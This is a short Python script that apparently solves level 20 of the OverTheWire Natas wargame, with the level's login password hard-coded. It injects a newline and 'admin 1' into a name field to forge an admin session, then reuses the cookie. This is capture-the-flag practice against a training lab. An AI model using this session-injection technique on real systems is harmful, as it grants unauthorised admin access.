#! /bin/python
import requests, string, sys, binascii, codecs
url = "http://natas20.natas.labs.overthewire.org"
username = "natas20"
password = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"

r = requests.post(url, auth=(username, password), data=(dict(name="test\nadmin 1")))
cookie = r.cookies.get_dict()

r2 = requests.get(url, auth=(username, password), cookies=cookie)
print (r2.content)